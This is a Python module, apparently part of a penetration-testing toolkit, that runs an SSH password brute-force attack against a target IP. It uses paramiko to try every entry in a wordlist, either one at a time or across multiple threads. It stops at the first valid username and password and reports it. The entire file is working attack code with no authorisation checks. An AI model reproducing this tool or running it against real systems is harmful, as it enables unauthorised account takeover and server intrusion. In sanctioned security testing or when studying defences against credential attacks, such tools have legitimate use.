# SSH Brute Force

from .progress import ProgressUpdater
import os
import time
from threading import Thread, Lock, Event
from queue import Queue, Empty
import paramiko
import socket
import config as conf

def TrySsh(ip, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=username, password=password, timeout=3)
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except socket.timeout:
        return False
    except Exception:
        return False
    finally:
        try:
            client.close()
        except:
            pass

def BruteForceSlow(ip, username, passwords):
    updater = ProgressUpdater(len(passwords))
    updater.start()

    attempts = 0
    for password in passwords:
        success = TrySsh(ip, username, password)
        updater.increment()
        attempts += 1

        if success:
            updater.stop()
            return f"{username}:{password}", attempts

    updater.stop()
    return None, attempts

def BruteForceCustom(ip, username, passwords, threadCount=10, delay=0.1):
    passwordQueue = Queue()
    for pwd in passwords:
        passwordQueue.put(pwd)

    found = {"status": False, "credential": None}
    lock = Lock()
    stopEvent = Event()

    updater = ProgressUpdater(len(passwords))
    updater.start()

    attempts = 0
    attemptsLock = Lock()  # To safely increment attempts across threads

    def worker():
        nonlocal found, attempts

        while not stopEvent.is_set():
            try:
                password = passwordQueue.get_nowait()
            except Empty:
                break  # No more passwords

            if stopEvent.is_set():
                passwordQueue.put(password)
                break

            success = TrySsh(ip, username, password)
            updater.increment()
            
            with attemptsLock:
                attempts += 1

            if success:
                with lock:
                    if not found["status"]:
                        found["status"] = True
                        found["credential"] = f"{username}:{password}"
                        stopEvent.set()
                break

            passwordQueue.task_done()
            time.sleep(delay)

    threads = []
    for _ in range(threadCount):
        t = Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    updater.stop()
    return found["credential"], attempts

def BruteForceSsh(ip, username, passwordFile, mode="slow", baseDir=None, delay=0.1):
    print(f"\n{conf.BOLD}Starting SSH Brute Force on {ip} with username '{username}' in {mode.upper()} mode.\n{conf.RESET}")

    toolDir    = os.path.dirname(__file__)
    modulesDir = os.path.dirname(toolDir)

    if os.path.isabs(passwordFile):
        passwordPath = passwordFile
    else:
        passwordPath = os.path.join(modulesDir, passwordFile)

    if not os.path.isfile(passwordPath):
        print(f"[!] Password file not found: {passwordPath}")
        return None

    try:
        with open(passwordPath, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Error reading password file: {e}")
        return None

    totalPasswords = len(passwords)
    startTime = time.time()

    if mode == "fast":
        result, totalAttempts = BruteForceCustom(ip, username, passwords, delay=delay)
    else:
        result, totalAttempts = BruteForceSlow(ip, username, passwords)

    endTime = time.time()
    duration = round(endTime - startTime, 2)

    if result:
        print(f"{conf.RED}\n\n[+] Credential found: {conf.RESET}{conf.BOLD}{result}{conf.RESET}")
    else:
        print(f"\n{conf.RED}[-] No valid credentials found.{conf.RESET}")

    # Return all the info needed for the report
    return {
        "ip": ip,
        "username": username,
        "passwordFile": os.path.basename(passwordFile),
        "totalPasswords": totalPasswords,
        "totalAttempts": totalAttempts,
        "duration": duration,
        "result": result if result else "not found"
    }
